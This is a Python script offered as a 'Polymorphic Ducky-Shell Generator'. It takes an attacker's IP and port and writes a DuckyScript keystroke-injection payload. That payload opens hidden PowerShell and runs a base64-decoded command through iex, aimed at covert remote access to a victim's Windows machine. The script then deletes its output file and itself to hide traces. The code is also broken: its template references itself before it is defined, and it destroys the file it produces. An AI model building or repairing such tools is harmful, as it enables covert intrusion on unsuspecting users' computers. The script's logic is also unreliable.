import os
import base64
import time
import sys

def encode_base64(data):
    return base64.b64encode(data.encode()).decode()

ascii_art_title = """
┬─┐┬ ┬┌┬┐┬ ┬┬  ┌─┐┌─┐┌─┐
├┬┘│ │ │ ├─┤│  ├┤ └─┐└─┐
┴└─└─┘ ┴ ┴ ┴┴─┘└─┘└─┘└─┘
Polymorphic Ducky-Shell Generator
by https://github.com/peroxic/ | @peroxic on telegram
"""

def get_valid_input(prompt, type_=str, condition=lambda x: True, error_msg="Invalid input."):
    while True:
        user_input = input(prompt)
        try:
            user_input = type_(user_input)
            if condition(user_input):
                return user_input
            else:
                print(error_msg)
        except ValueError:
            print(error_msg)

ip_address = get_valid_input("Enter the IP address: ", str, lambda x: x.count('.') == 3, "Invalid IP address.")
port = get_valid_input("Enter the port number: ", int, lambda x: 1 <= x <= 65535, "Port must be between 1 and 65535.")
delay = get_valid_input("Enter the delay (in milliseconds, default 100): ", int, lambda x: x >= 0, "Delay must be a non-negative integer.")
file_name = get_valid_input("Enter the output file name (without extension): ", str)

delay = delay if delay else 100

os.environ['DUCKY_IP'] = ip_address
os.environ['DUCKY_PORT'] = str(port)

duckyscript_code_template = f"""
DEFINE ADDRESS '%DUCKY_IP%'   REM Replace with your IP
DEFINE PORT %DUCKY_PORT%           REM Replace with your port

EXTENSION DETECT_READY
    DEFINE RESPONSE_DELAY {delay}
    DEFINE ITERATION_LIMIT 20

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < ITERATION_LIMIT))
        CAPSLOCK
        DELAY RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

DELAY 750

GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden
DELAY 500

REM Obfuscated PowerShell Command
STRING [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encode_base64(duckyscript_code_template)}'))
STRING | iex
DELAY 200
CAPSLOCK
"""

encoded_duckyscript_code = encode_base64(duckyscript_code_template)

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{file_name}.txt")

try:
    with open(desktop_path, "w") as file:
        file.write(f"{ascii_art_title}\n")
        file.write(f"Enter the IP address and port below:\n\n")
        file.write(f"# Base64 Encoded Ducky-Script Code\n")
        file.write(f"Encoded Script:\n{encoded_duckyscript_code}\n")
    print(f"Ducky-Script has been successfully written to {desktop_path}.")
except Exception as e:
    print(f"An error occurred: {e}")
    try:
        os.remove(sys.argv[0])
    except:
        pass
    sys.exit(1)

def cleanup_and_exit():
    try:
        os.remove(desktop_path)
    except Exception as e:
        print(f"Failed to remove file: {e}")
    try:
        os.remove(sys.argv[0])
    except Exception as e:
        print(f"Failed to remove script: {e}")
    sys.exit(1)

time.sleep(2)
cleanup_and_exit()
